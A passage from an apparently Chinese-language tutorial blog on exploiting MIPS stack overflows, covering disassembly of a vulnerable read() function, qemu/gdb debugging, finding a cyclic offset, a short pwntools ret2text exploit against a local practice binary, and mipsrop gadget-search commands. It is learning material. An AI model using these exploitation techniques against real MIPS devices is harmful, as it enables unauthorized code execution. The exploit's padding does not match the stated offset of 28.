class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">s8</span>,<span class="hljs-number">0x18</span>(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">0040045</span>c <span class="hljs-number">20</span> <span class="hljs-number">00</span> <span class="hljs-keyword">bd </span><span class="hljs-number">27</span>     <span class="hljs-keyword">addiu </span>     <span class="hljs-built_in">sp</span>,<span class="hljs-built_in">sp</span>,<span class="hljs-number">0x20</span><br><span class="hljs-number">00400460</span> <span class="hljs-number">08</span> <span class="hljs-number">00</span> e0 <span class="hljs-number">03</span>     <span class="hljs-keyword">jr </span>        <span class="hljs-built_in">ra</span><br><br></code></pre></td></tr></table></figure><h3 id="vuln函数"><a href="#vuln函数" class="headerlink" title="vuln函数"></a>vuln函数</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><br>                     **************************************************************<br>                     *                          FUNCTION                          *<br>                     **************************************************************<br>                     undefined vlun()<br>     undefined         <span class="hljs-built_in">v0</span>:<span class="hljs-number">1</span>           &lt;RETURN&gt;<br>     undefined4        Stack[-<span class="hljs-number">0x4</span>]:<span class="hljs-number">4</span>  local_4                                 XREF[<span class="hljs-number">1</span>]:     <span class="hljs-number">004003</span>c8(W)  <br>     undefined4        Stack[-<span class="hljs-number">0x8</span>]:<span class="hljs-number">4</span>  local_8                                 XREF[<span class="hljs-number">1</span>]:     <span class="hljs-number">004003</span>cc(W)  <br>     undefined4        Stack[-<span class="hljs-number">0x28</span>]:<span class="hljs-number">4</span> local_28                                XREF[<span class="hljs-number">1</span>]:     <span class="hljs-number">004003</span>dc(W)  <br>                     vlun                                            XREF[<span class="hljs-number">2</span>]:     Entry Point(*), main:<span class="hljs-number">00400444</span>(c)  <br><span class="hljs-number">004003</span>c4 c8 ff <span class="hljs-keyword">bd </span><span class="hljs-number">27</span>     <span class="hljs-keyword">addiu </span>     <span class="hljs-built_in">sp</span>,<span class="hljs-built_in">sp</span>,-<span class="hljs-number">0x38</span><br><span class="hljs-number">004003</span>c8 <span class="hljs-number">34</span> <span class="hljs-number">00</span> <span class="hljs-keyword">bf </span>af     <span class="hljs-keyword">sw </span>        <span class="hljs-built_in">ra</span>,local_4(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">004003</span>cc <span class="hljs-number">30</span> <span class="hljs-number">00</span> <span class="hljs-keyword">be </span>af     <span class="hljs-keyword">sw </span>        <span class="hljs-built_in">s8</span>,local_8(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">004003</span>d0 <span class="hljs-number">25</span> f0 <span class="hljs-built_in">a0</span> <span class="hljs-number">03</span>     <span class="hljs-keyword">or </span>        <span class="hljs-built_in">s8</span>,<span class="hljs-built_in">sp</span>,<span class="hljs-built_in">zero</span><br><span class="hljs-number">004003</span>d4 <span class="hljs-number">42</span> <span class="hljs-number">00</span> <span class="hljs-number">1</span>c <span class="hljs-number">3</span>c     <span class="hljs-keyword">lui </span>       <span class="hljs-built_in">gp</span>,<span class="hljs-number">0x42</span><br><span class="hljs-number">004003</span>d8 e0 <span class="hljs-number">71</span> <span class="hljs-number">9</span>c <span class="hljs-number">27</span>     <span class="hljs-keyword">addiu </span>     <span class="hljs-built_in">gp</span>=&gt;_<span class="hljs-built_in">gp</span>,<span class="hljs-built_in">gp</span>,<span class="hljs-number">0x71e0</span><br><span class="hljs-number">004003</span>dc <span class="hljs-number">10</span> <span class="hljs-number">00</span> <span class="hljs-keyword">bc </span>af     <span class="hljs-keyword">sw </span>        <span class="hljs-built_in">gp</span>=&gt;_<span class="hljs-built_in">gp</span>,local_28(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">004003</span>e0 <span class="hljs-number">18</span> <span class="hljs-number">00</span> c0 af     <span class="hljs-keyword">sw </span>        <span class="hljs-built_in">zero</span>,<span class="hljs-number">0x18</span>(<span class="hljs-built_in">s8</span>)<br><span class="hljs-number">004003</span>e4 <span class="hljs-number">1</span>c <span class="hljs-number">00</span> c0 af     <span class="hljs-keyword">sw </span>        <span class="hljs-built_in">zero</span>,<span class="hljs-number">0x1c</span>(<span class="hljs-built_in">s8</span>)<br><span class="hljs-number">004003</span>e8 <span class="hljs-number">20</span> <span class="hljs-number">00</span> c0 af     <span class="hljs-keyword">sw </span>        <span class="hljs-built_in">zero</span>,<span class="hljs-number">0x20</span>(<span class="hljs-built_in">s8</span>)<br><span class="hljs-number">004003</span>ec <span class="hljs-number">24</span> <span class="hljs-number">00</span> c0 af     <span class="hljs-keyword">sw </span>        <span class="hljs-built_in">zero</span>,<span class="hljs-number">0x24</span>(<span class="hljs-built_in">s8</span>)<br><span class="hljs-number">004003</span>f0 <span class="hljs-number">28</span> <span class="hljs-number">00</span> c0 af     <span class="hljs-keyword">sw </span>        <span class="hljs-built_in">zero</span>,<span class="hljs-number">0x28</span>(<span class="hljs-built_in">s8</span>)<br><span class="hljs-number">004003</span>f4 e8 <span class="hljs-number">03</span> <span class="hljs-number">06</span> <span class="hljs-number">24</span>     li         <span class="hljs-built_in">a2</span>,<span class="hljs-number">0x3e8</span><br><span class="hljs-number">004003</span>f8 <span class="hljs-number">18</span> <span class="hljs-number">00</span> c2 <span class="hljs-number">27</span>     <span class="hljs-keyword">addiu </span>     <span class="hljs-built_in">v0</span>,<span class="hljs-built_in">s8</span>,<span class="hljs-number">0x18</span><br><span class="hljs-number">004003</span>fc <span class="hljs-number">25</span> <span class="hljs-number">28</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span>     <span class="hljs-keyword">or </span>        <span class="hljs-built_in">a1</span>,<span class="hljs-built_in">v0</span>,<span class="hljs-built_in">zero</span><br><span class="hljs-number">00400400</span> <span class="hljs-number">25</span> <span class="hljs-number">20</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>     <span class="hljs-keyword">or </span>        <span class="hljs-built_in">a0</span>,<span class="hljs-built_in">zero</span>,<span class="hljs-built_in">zero</span><br><span class="hljs-number">00400404</span> <span class="hljs-number">34</span> <span class="hljs-number">80</span> <span class="hljs-number">82</span> <span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">v0</span>,-<span class="hljs-number">0x7fcc</span>(<span class="hljs-built_in">gp</span>)=&gt;-&gt;read                           = <span class="hljs-number">004004</span>ac<br><span class="hljs-number">00400408</span> <span class="hljs-number">25</span> c8 <span class="hljs-number">40</span> <span class="hljs-number">00</span>     <span class="hljs-keyword">or </span>        <span class="hljs-built_in">t9</span>,<span class="hljs-built_in">v0</span>,<span class="hljs-built_in">zero</span><br><span class="hljs-number">0040040</span>c <span class="hljs-number">27</span> <span class="hljs-number">00</span> <span class="hljs-number">11</span> <span class="hljs-number">04</span>     <span class="hljs-keyword">bal </span>       read                                             ssize_t read(int __fd, void * __<br><span class="hljs-number">00400410</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>     _nop<br><span class="hljs-number">00400414</span> <span class="hljs-number">10</span> <span class="hljs-number">00</span> dc <span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">gp</span>,<span class="hljs-number">0x10</span>(<span class="hljs-built_in">s8</span>)<br><span class="hljs-number">00400418</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>     <span class="hljs-keyword">nop</span><br><span class="hljs-keyword"></span><span class="hljs-number">0040041</span>c <span class="hljs-number">25</span> e8 c0 <span class="hljs-number">03</span>     <span class="hljs-keyword">or </span>        <span class="hljs-built_in">sp</span>,<span class="hljs-built_in">s8</span>,<span class="hljs-built_in">zero</span><br><span class="hljs-number">00400420</span> <span class="hljs-number">34</span> <span class="hljs-number">00</span> <span class="hljs-keyword">bf </span><span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">ra</span>,<span class="hljs-number">0x34</span>(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">00400424</span> <span class="hljs-number">30</span> <span class="hljs-number">00</span> <span class="hljs-keyword">be </span><span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">s8</span>,<span class="hljs-number">0x30</span>(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">00400428</span> <span class="hljs-number">38</span> <span class="hljs-number">00</span> <span class="hljs-keyword">bd </span><span class="hljs-number">27</span>     <span class="hljs-keyword">addiu </span>     <span class="hljs-built_in">sp</span>,<span class="hljs-built_in">sp</span>,<span class="hljs-number">0x38</span><br><span class="hljs-number">0040042</span>c <span class="hljs-number">08</span> <span class="hljs-number">00</span> e0 <span class="hljs-number">03</span>     <span class="hljs-keyword">jr </span>        <span class="hljs-built_in">ra</span><br><span class="hljs-number">00400430</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>     _nop<br><br></code></pre></td></tr></table></figure><p>可以看到因为是非叶子函数,因此我们计算完偏移后可以直接使用ret2text的办法来完成利用<br>这里简单提一下gdb调试mips架构的方法,我这里安装了pwndbg插件,并且需要安装gdb-multiarch<br>调试方法如下:</p><ol><li>qemu调起程序</li></ol><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">qemu</span>-mipsel -g <span class="hljs-number">9981</span> -L mipsel-linux-gnu ./no_leaf<br></code></pre></td></tr></table></figure><ol start="2"><li>gdb-multiarc attach调试</li></ol><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> architecture <span class="hljs-comment">mips</span><br>target <span class="hljs-comment">remote localhost:9981</span><br></code></pre></td></tr></table></figure><p>然后就可以进行基本调试了</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">LEGEND:</span> STACK | HEAP | CODE | DATA | RWX | RODATA<br>─────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────<br> V0   <span class="hljs-number">0x0</span><br> V1   <span class="hljs-number">0x0</span><br> A0   <span class="hljs-number">0x0</span><br> A1   <span class="hljs-number">0x0</span><br> A2   <span class="hljs-number">0x0</span><br> A3   <span class="hljs-number">0x0</span><br> T0   <span class="hljs-number">0x0</span><br> T1   <span class="hljs-number">0x0</span><br> T2   <span class="hljs-number">0x0</span><br> T3   <span class="hljs-number">0x0</span><br> T4   <span class="hljs-number">0x0</span><br> T5   <span class="hljs-number">0x0</span><br> T6   <span class="hljs-number">0x0</span><br> T7   <span class="hljs-number">0x0</span><br> T8   <span class="hljs-number">0x0</span><br> T9   <span class="hljs-number">0x0</span><br> S0   <span class="hljs-number">0x0</span><br> S1   <span class="hljs-number">0x0</span><br> S2   <span class="hljs-number">0x0</span><br> S3   <span class="hljs-number">0x0</span><br> S4   <span class="hljs-number">0x0</span><br> S5   <span class="hljs-number">0x0</span><br> S6   <span class="hljs-number">0x0</span><br> S7   <span class="hljs-number">0x0</span><br> S8   <span class="hljs-number">0x0</span><br> FP   <span class="hljs-number">0x0</span><br> <span class="hljs-built_in">SP</span>   <span class="hljs-number">0x76ffefb0</span> ◂— <span class="hljs-number">0x1</span><br> PC   <span class="hljs-number">0x400170</span> ◂— move   $<span class="hljs-meta">zero</span>, $ra /* <span class="hljs-string">&#x27;%&#x27;</span> */<br>───────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────<br> ► <span class="hljs-number">0x400170</span>    move   $<span class="hljs-meta">zero</span>, $ra<br>   <span class="hljs-number">0x400174</span>    bal    <span class="hljs-number">0x40017c</span><br>   <span class="hljs-number">0x400178</span>    <span class="hljs-keyword">nop</span>    <br>   <span class="hljs-number">0x40017c</span>    lui    $gp, <span class="hljs-number">0x42</span><br>   <span class="hljs-number">0x400180</span>    addiu  $gp, $gp, <span class="hljs-number">0x71e0</span><br>   <span class="hljs-number">0x400184</span>    move   $ra, $<span class="hljs-meta">zero</span><br>   <span class="hljs-number">0x400188</span>    lw     $a0, -<span class="hljs-number">0x7fe0</span>($gp)<br>   <span class="hljs-number">0x40018c</span>    lw     $a1, ($<span class="hljs-built_in">sp</span>)<br>   <span class="hljs-number">0x400190</span>    addiu  $a2, $<span class="hljs-built_in">sp</span>, <span class="hljs-number">4</span><br>   <span class="hljs-number">0x400194</span>    addiu  $<span class="hljs-meta">at</span>, $<span class="hljs-meta">zero</span>, -<span class="hljs-number">8</span><br>   <span class="hljs-number">0x400198</span>    <span class="hljs-keyword">and</span>    $<span class="hljs-built_in">sp</span>, $<span class="hljs-built_in">sp</span>, $<span class="hljs-meta">at</span><br>───────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────<br><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>│ <span class="hljs-built_in">sp</span>  <span class="hljs-number">0x76ffefb0</span> ◂— <span class="hljs-number">0x1</span><br><span class="hljs-number">01</span>:<span class="hljs-number">0004</span>│     <span class="hljs-number">0x76ffefb4</span> —▸ <span class="hljs-number">0x76fff16a</span> ◂— <span class="hljs-string">&#x27;./no_leaf&#x27;</span><br><span class="hljs-number">02</span>:<span class="hljs-number">0008</span>│     <span class="hljs-number">0x76ffefb8</span> ◂— <span class="hljs-number">0x0</span><br><span class="hljs-number">03</span>:000c│     <span class="hljs-number">0x76ffefbc</span> —▸ <span class="hljs-number">0x76fff174</span> ◂— <span class="hljs-string">&#x27;_=/usr/bin/qemu-mipsel&#x27;</span><br><span class="hljs-number">04</span>:<span class="hljs-number">0010</span>│     <span class="hljs-number">0x76ffefc0</span> —▸ <span class="hljs-number">0x76fff18b</span> ◂— <span class="hljs-string">&#x27;LC_CTYPE=en_US.UTF-8&#x27;</span><br><span class="hljs-number">05</span>:<span class="hljs-number">0014</span>│     <span class="hljs-number">0x76ffefc4</span> —▸ <span class="hljs-number">0x76fff1a0</span> ◂— <span class="hljs-number">0x435f534c</span> (<span class="hljs-string">&#x27;LS_C&#x27;</span>)<br><span class="hljs-number">06</span>:<span class="hljs-number">0018</span>│     <span class="hljs-number">0x76ffefc8</span> —▸ <span class="hljs-number">0x76fff728</span> ◂— <span class="hljs-string">&#x27;LSCOLORS=Gxfxcxdxbxegedabagacad&#x27;</span><br><span class="hljs-number">07</span>:001c│     <span class="hljs-number">0x76ffefcc</span> —▸ <span class="hljs-number">0x76fff748</span> ◂— <span class="hljs-string">&#x27;LESS=-R&#x27;</span><br>─────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────<br> ► f <span class="hljs-number">0</span>   <span class="hljs-number">400170</span><br></code></pre></td></tr></table></figure><p>这里就用简单的cyclic指令生成一串字符串来测试偏移</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; cyclic <span class="hljs-number">200</span><br><span class="hljs-attribute">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br></code></pre></td></tr></table></figure><p>输入字符串后程序崩溃</p><p>可以看到pwndbg里输出</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs prolog"><span class="hljs-symbol">Program</span> received signal <span class="hljs-symbol">SIGSEGV</span>, <span class="hljs-symbol">Segmentation</span> fault.<br><span class="hljs-number">0x61616168</span> in ?? ()<br><span class="hljs-symbol">LEGEND</span>: <span class="hljs-symbol">STACK</span> | <span class="hljs-symbol">HEAP</span> | <span class="hljs-symbol">CODE</span> | <span class="hljs-symbol">DATA</span> | <span class="hljs-symbol">RWX</span> | <span class="hljs-symbol">RODATA</span><br>─────────────────────────────────────────────────[ <span class="hljs-symbol">REGISTERS</span> ]──────────────────────────────────────────────────<br> <span class="hljs-symbol">V0</span>   <span class="hljs-number">0xc9</span><br> <span class="hljs-symbol">V1</span>   <span class="hljs-number">0x0</span><br> <span class="hljs-symbol">A0</span>   <span class="hljs-number">0x0</span><br> <span class="hljs-symbol">A1</span>   <span class="hljs-number">0x76ffee28</span> ◂— <span class="hljs-number">0x61616161</span> (<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br> <span class="hljs-symbol">A2</span>   <span class="hljs-number">0x3e8</span><br> <span class="hljs-symbol">A3</span>   <span class="hljs-number">0x0</span><br> <span class="hljs-symbol">T0</span>   <span class="hljs-number">0x81010303</span><br> <span class="hljs-symbol">T1</span>   <span class="hljs-number">0x666165</span><br> <span class="hljs-symbol">T2</span>   <span class="hljs-number">0x2f494e4a</span> (<span class="hljs-string">&#x27;JNI/&#x27;</span>)<br> <span class="hljs-symbol">T3</span>   <span class="hljs-number">0xffffffff</span><br> <span class="hljs-symbol">T4</span>   <span class="hljs-number">0x0</span><br> <span class="hljs-symbol">T5</span>   <span class="hljs-number">0x0</span><br> <span class="hljs-symbol">T6</span>   <span class="hljs-number">0x0</span><br> <span class="hljs-symbol">T7</span>   <span class="hljs-number">0x0</span><br> <span class="hljs-symbol">T8</span>   <span class="hljs-number">0x9</span><br> <span class="hljs-symbol">T9</span>   <span class="hljs-number">0x400470</span> ◂— lui    $gp, <span class="hljs-number">2</span><br> <span class="hljs-symbol">S0</span>   <span class="hljs-number">0x0</span><br> <span class="hljs-symbol">S1</span>   <span class="hljs-number">0x41f000</span> ◂— <span class="hljs-number">0xffffffff</span><br> <span class="hljs-symbol">S2</span>   <span class="hljs-number">0x0</span><br> <span class="hljs-symbol">S3</span>   <span class="hljs-number">0x0</span><br> <span class="hljs-symbol">S4</span>   <span class="hljs-number">0x0</span><br> <span class="hljs-symbol">S5</span>   <span class="hljs-number">0x0</span><br> <span class="hljs-symbol">S6</span>   <span class="hljs-number">0x0</span><br> <span class="hljs-symbol">S7</span>   <span class="hljs-number">0x0</span><br> <span class="hljs-symbol">S8</span>   <span class="hljs-number">0x61616167</span> (<span class="hljs-string">&#x27;gaaa&#x27;</span>)<br> <span class="hljs-symbol">FP</span>   <span class="hljs-number">0x76ffee48</span> ◂— <span class="hljs-string">&#x27;iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n&#x27;</span><br> <span class="hljs-symbol">SP</span>   <span class="hljs-number">0x76ffee48</span> ◂— <span class="hljs-string">&#x27;iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n&#x27;</span><br> <span class="hljs-symbol">PC</span>   <span class="hljs-number">0x61616168</span> (<span class="hljs-string">&#x27;haaa&#x27;</span>)<br>───────────────────────────────────────────────────[ <span class="hljs-symbol">DISASM</span> ]───────────────────────────────────────────────────<br><span class="hljs-symbol">Invalid</span> address <span class="hljs-number">0x61616168</span><br>───────────────────────────────────────────────────[ <span class="hljs-symbol">STACK</span> ]────────────────────────────────────────────────────<br><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>│ fp sp  <span class="hljs-number">0x76ffee48</span> ◂— <span class="hljs-string">&#x27;iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n&#x27;</span><br><span class="hljs-number">01</span>:<span class="hljs-number">0004</span>│        <span class="hljs-number">0x76ffee4c</span> ◂— <span class="hljs-string">&#x27;jaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n&#x27;</span><br><span class="hljs-number">02</span>:<span class="hljs-number">0008</span>│        <span class="hljs-number">0x76ffee50</span> ◂— <span class="hljs-string">&#x27;kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n&#x27;</span><br><span class="hljs-number">03</span>:<span class="hljs-number">000</span>c│        <span class="hljs-number">0x76ffee54</span> ◂— <span class="hljs-string">&#x27;laaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n&#x27;</span><br><span class="hljs-number">04</span>:<span class="hljs-number">0010</span>│        <span class="hljs-number">0x76ffee58</span> ◂— <span class="hljs-string">&#x27;maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n&#x27;</span><br><span class="hljs-number">05</span>:<span class="hljs-number">0014</span>│        <span class="hljs-number">0x76ffee5c</span> ◂— <span class="hljs-string">&#x27;naaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n&#x27;</span><br><span class="hljs-number">06</span>:<span class="hljs-number">0018</span>│        <span class="hljs-number">0x76ffee60</span> ◂— <span class="hljs-string">&#x27;oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n&#x27;</span><br><span class="hljs-number">07</span>:<span class="hljs-number">001</span>c│        <span class="hljs-number">0x76ffee64</span> ◂— <span class="hljs-string">&#x27;paaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n&#x27;</span><br>─────────────────────────────────────────────────[ <span class="hljs-symbol">BACKTRACE</span> ]──────────────────────────────────────────────────<br> ► f <span class="hljs-number">0</span> <span class="hljs-number">61616168</span><br>────────────────────────────────────────────────────────────────────────────────────────────────────────────────<br><span class="hljs-symbol">Program</span> received signal <span class="hljs-symbol">SIGSEGV</span><br><br></code></pre></td></tr></table></figure><p>利用cyclic -l查看偏移可以得到偏移量为28</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; cyclic -l <span class="hljs-number">0</span>x61616168<br><span class="hljs-attribute">28</span><br></code></pre></td></tr></table></figure><p>exp和正常的pwn没什么区别,<br>本例exp如下</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">from</span> <span class="hljs-variable">pwn</span> <span class="hljs-variable">import</span> *<br><span class="hljs-variable">p</span>=<span class="hljs-function"><span class="hljs-title">process</span>(<span class="hljs-string">&quot;./no_leaf&quot;</span>)</span><br><span class="hljs-variable">payload</span>=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0</span><span class="hljs-variable">x38</span>+<span class="hljs-function"><span class="hljs-title">p32</span>(<span class="hljs-number">0</span><span class="hljs-variable">x400370</span>)</span><br><span class="hljs-variable">p.sendline</span>(<span class="hljs-variable">payload</span>)<br><span class="hljs-variable">p.interactive</span>()<br></code></pre></td></tr></table></figure><h2 id="叶子函数"><a href="#叶子函数" class="headerlink" title="叶子函数"></a>叶子函数</h2><p>在上述的介绍中可以知道,叶子函数是不存在堆栈上的,他会将返回地址存在$ra指针中,因此叶子函数的栈溢出并不好利用,但是在可以大量溢出的情况下,我们还是可以利用叶子函数的溢出的</p><h2 id="rop的使用"><a href="#rop的使用" class="headerlink" title="rop的使用"></a>rop的使用</h2><p>在做正常的pwn题时,构造rop链是一种非常具有杀伤力的攻击手段,在mips架构中自然也不逞多让,平常我们构造rop链可以通过ropgadget来自动化搜索gadget,而mips架构中也有一个很好用的搜索gadget的插件,即使用IDA的<a href="https://github.com/devttys0/ida/tree/master/plugins/mipsrop">mipsgadget插件</a></p><p><em><strong>注:本插件适用于IDA6.8,但IDA7.0其实也有大师傅写了相应的脚本</strong></em></p><p>使用方法:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">mipsrop<span class="hljs-selector-class">.help</span>()           帮助菜单<br>mipsrop<span class="hljs-selector-class">.doubles</span>()        打印一系列函数调用gadget<br>mipsrop<span class="hljs-selector-class">.stackfinder</span>()    寻找栈数据可控的 rop，放到寄存器中<br>mipsrop<span class="hljs-selector-class">.summary</span>()        列出所有的可用 rop<br>mipsrop<span class="hljs-selector-class">.system</span>()         列出用于执行system函数<br>mipsrop<span class="hljs-selector-class">.find</span>(xxx)        查找特定rop<br>mipsrop<span class="hljs-selector-class">.tails</span>()          列出将栈上的数据保存在<span class="hljs-variable">$ra</span>等寄存器中的rop<br></code></pre></td></tr></table></figure><p>具体rop的使用和正常的pwn利用没有什么特别大的区别,这里也不再过多阐述</p><h2 id="简单shellcode的编写思路"><a href="#简单shellcode的编写思路" class="headerlink" title="简单shellcode的编写思路"></a>简单shellcode的编写思路</h2><p>我这里记录下我平时写shellcode所用的方法</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">首先用<span class="hljs-keyword">c</span>语言完成所需的程序<span class="hljs-punctuation">,</span>然后利用gcc生成文件<br>然后可以用objdump来进行反汇编<span class="hljs-punctuation">,</span>看一下是否会有坏指令<span 